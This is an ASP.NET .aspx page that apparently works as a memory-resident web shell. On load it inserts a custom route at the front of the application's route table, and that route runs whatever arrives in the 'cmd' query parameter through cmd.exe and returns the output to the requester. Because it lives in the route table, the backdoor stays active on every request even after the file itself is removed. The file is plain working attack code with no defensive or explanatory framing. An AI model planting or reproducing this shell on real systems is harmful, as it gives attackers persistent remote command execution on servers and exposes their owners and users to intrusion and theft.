<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase httpContext)
        {
            String cmd = httpContext.Request.QueryString["cmd"];
            if (cmd != null)
            {
                HttpResponseBase response = httpContext.Response;
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + cmd;
                Debug.WriteLine(p.StartInfo.FileName);
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }

            Debug.WriteLine("Auth filter inject");
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }
</script>

<%
    RouteCollection routes = RouteTable.Routes;
    routes.Insert(0, (RouteBase)new MyRoute());
%>